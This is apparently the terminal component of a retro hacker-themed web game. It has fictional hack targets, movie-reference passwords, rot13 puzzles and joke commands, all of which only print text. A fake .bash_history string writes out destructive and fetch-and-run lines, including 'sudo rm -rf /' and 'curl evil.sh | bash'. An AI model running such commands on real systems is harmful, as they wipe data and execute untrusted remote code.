import { useState, useEffect, useRef } from 'react'
import { Audio, fmtCrypto, STORAGE_KEY } from './state.jsx'

// ── Hack targets (NPC — player machines come in Phase 2) ─────────────────────
const HACK_TARGETS = [
  { host: 'gibson.mil',          ip: '10.0.4.7',       difficulty: 1, reward: 0.015, flavor: 'US Military relay — low-sec gateway.',           kind: 'portscan' },
  { host: 'mainframe.ellingson', ip: '198.51.100.23',  difficulty: 2, reward: 0.04,  flavor: 'Ellingson Mineral Co. — rainbow books onsite.',   kind: 'password' },
  { host: 'gateway.globalnet',   ip: '203.0.113.8',    difficulty: 2, reward: 0.035, flavor: 'Tokyo uplink. Try not to trip the ICE.',           kind: 'cipher'   },
  { host: 'darkstar.corp',       ip: '172.16.9.42',    difficulty: 3, reward: 0.09,  flavor: 'Corporate mainframe. Heavy firewall.',             kind: 'portscan' },
  { host: 'nsa.gov.ghost',       ip: '192.0.2.99',     difficulty: 4, reward: 0.22,  flavor: '⚠ THREE LETTER AGENCY — trace enabled',            kind: 'password' },
  { host: 'orbital.sat-7',       ip: '198.18.7.7',     difficulty: 3, reward: 0.12,  flavor: 'Low-orbit sat uplink. Window: 90 seconds.',        kind: 'cipher'   },
  { host: 'atm-central.bnk',     ip: '10.10.10.10',    difficulty: 2, reward: 0.055, flavor: 'First National ATM switch.',                       kind: 'password' },
  { host: 'phreak.pbx.7734',     ip: '64.64.64.64',    difficulty: 1, reward: 0.02,  flavor: 'Old PBX. Tone-dial still works.',                  kind: 'portscan' },
]

const PASSWORDS     = ['godmode','swordfish','hunter2','rosebud','letmein','joshua','orange','trustno1','matrix','neural','megaman','zer0cool','crashoverride','acid','phreak','cyber']
const CIPHER_PHRASES = ['THE MEDIUM IS THE MESSAGE','HACK THE PLANET','MESS WITH THE BEST','TRUST NO ONE','MIND IS A RAZOR BLADE','RESISTANCE IS FUTILE']

function rot13(s) {
  return s.replace(/[A-Z]/g, c => String.fromCharCode((c.charCodeAt(0) - 65 + 13) % 26 + 65))
}

function TermLine({ text, cls }) {
  return <div className={'term-line ' + (cls || '')}>{text}</div>
}

export function Terminal({ state, setState, onOpenApp }) {
  const [lines, setLines]   = useState([])
  const [input, setInput]   = useState('')
  const [history, setHistory] = useState([])
  const [histIdx, setHistIdx] = useState(-1)
  const [mode, setMode]     = useState({ name: 'shell' })
  const [busy, setBusy]     = useState(false)
  const bodyRef  = useRef(null)
  const inputRef = useRef(null)

  const push = (text, cls) => setLines(ls => [...ls, { text, cls, id: Math.random() }])
  const typeOut = async (text, cls, speedMul = 1) => {
    const tokens = text.split('')
    let buf = ''
    const id = Math.random()
    setLines(ls => [...ls, { text: '', cls, id }])
    const perChar = Math.max(4, (100 / (window.__typeSpeed || 22)) * speedMul)
    for (let i = 0; i < tokens.length; i++) {
      buf += tokens[i]
      setLines(ls => ls.map(l => l.id === id ? { ...l, text: buf } : l))
      if (i % 3 === 0) Audio.key()
      await new Promise(r => setTimeout(r, perChar))
    }
  }

  useEffect(() => {
    ;(async () => {
      await typeOut(' /$$   /$$  /$$$$$$   /$$$$$$  /$$   /$$', 'mag', 0.3)
      await typeOut('| $$  | $$ /$$__  $$ /$$__  $$| $$  /$$/','mag', 0.3)
      await typeOut('| $$$$$$$$| $$$$$$$$| $$      | $$$$$$/  ','mag', 0.3)
      await typeOut('| $$_  $$ | $$__  $$| $$      | $$__  $$ ','mag', 0.3)
      await typeOut('| $$  | $$| $$  | $$|  $$$$$$/| $$  \\ $$','mag', 0.3)
      await typeOut('|__/  |__/|__/  |__/ \\______/ |__/  |__/','mag', 0.3)
      push('', '')
      await typeOut('HX//OS 2.4 — Terminal Session 0xDEADBEEF', 'ok')
      await typeOut(`Welcome back, operator. Hashrate: ${state.hashrate} H/s  Balance: ${fmtCrypto(state.crypto)} ⟠`, 'dim')
      push("Type 'help' to list commands.", '')
      push('', '')
    })()
    setTimeout(() => inputRef.current?.focus(), 100)
  }, [])

  useEffect(() => {
    if (bodyRef.current) bodyRef.current.scrollTop = bodyRef.current.scrollHeight
  }, [lines])

  const sleep = (ms) => new Promise(r => setTimeout(r, ms))

  const runCmd = async (raw) => {
    const cmd = raw.trim()
    push(`root@hx-os:~# ${cmd}`, '')
    if (!cmd) return
    setHistory(h => [...h, cmd])
    setHistIdx(-1)
    const [c, ...args] = cmd.split(/\s+/)
    setBusy(true)
    try { await dispatch(c.toLowerCase(), args) }
    catch (e) { push('!! error: ' + e.message, 'err') }
    setBusy(false)
  }

  const dispatch = async (c, args) => {
    switch (c) {
      case 'help':  return help()
      case 'clear': case 'cls': return setLines([])
      case 'whoami': return push('root (uid=0) gid=0(wheel) — you are Zero Cool', 'ok')
      case 'date':   return push(new Date().toString(), 'dim')
      case 'ls':     return push('bin/  etc/  home/  var/  exploits/  wallet.dat  .bash_history', '')
      case 'cat':
        if (args[0] === 'wallet.dat') return push(`[ENCRYPTED WALLET]  balance: ${fmtCrypto(state.crypto)} ⟠`, 'ok')
        if (args[0] === '.bash_history') return push("sudo rm -rf /\nnmap -sS 10.0.0.0/8\ncurl evil.sh | bash\necho 'oh no'", 'dim')
        return push('cat: ' + (args[0] || '???') + ': no such file', 'err')
      case 'balance': case 'wallet':
        return push(`⟠ ${fmtCrypto(state.crypto)}   (hashrate: ${state.hashrate} H/s)`, 'ok')
      case 'scan': case 'nmap':  return scanHosts()
      case 'hack': case 'exploit': return hackHost(args[0])
      case 'mine':
        onOpenApp('miner'); return push('> launching miner.app…', 'ok')
      case 'snake': return playSnake()
      case 'irc':
        onOpenApp('irc'); return push('> launching irc.exe…', 'ok')
      case 'browser': case 'browse':
        onOpenApp('browser'); return push('> launching net::browser…', 'ok')
      case 'notes': case 'nano':
        onOpenApp('notepad'); return push('> opening notepad…', 'ok')
      case 'calc':
        onOpenApp('calculator'); return push('> calc.exe — launched', 'ok')
      case 'trash':
        onOpenApp('trash'); return push('> /tmp/.Trash — opening', 'ok')
      case 'upgrade': case 'shop': return listUpgrades(args[0])
      case 'sudo':
        push('[sudo] password for root: ••••••••', 'dim')
        await sleep(500)
        return push('sudo: nice try.', 'err')
      case 'rm':
        if (args.includes('-rf') && args.includes('/')) {
          await typeOut('rm: catastrophic kernel panic', 'err')
          await typeOut('haha. just kidding.', 'dim')
          return
        }
        return push(`rm: ${args[0] || '?'}: cannot remove`, 'err')
      case 'exit': case 'logout':
        return push('connection held open. ESC to close window.', 'dim')
      case 'reset':
        if (confirm('Wipe all progress?')) { localStorage.removeItem(STORAGE_KEY); location.reload() }
        return
      case 'matrix': return matrix()
      case 'coffee': return push('☕ nothing happens. but you feel more alert.', 'ok')
      default: return push(`bash: ${c}: command not found. try 'help'`, 'err')
    }
  }

  const help = () => {
    const cmds = [
      ['help',                         'this menu'],
      ['scan / nmap',                  'list reachable hosts'],
      ['hack <host>',                  'attempt to breach a target'],
      ['mine',                         'launch crypto miner'],
      ['irc',                          'open IRC messenger'],
      ['snake',                        'the classic. highscore wins ⟠'],
      ['upgrade [rig|cpu|net]',        'spend ⟠ on hardware'],
      ['balance',                      'show wallet'],
      ['browser / notes / calc / trash', 'open GUI apps'],
      ['whoami, ls, cat, date',        'unix classics'],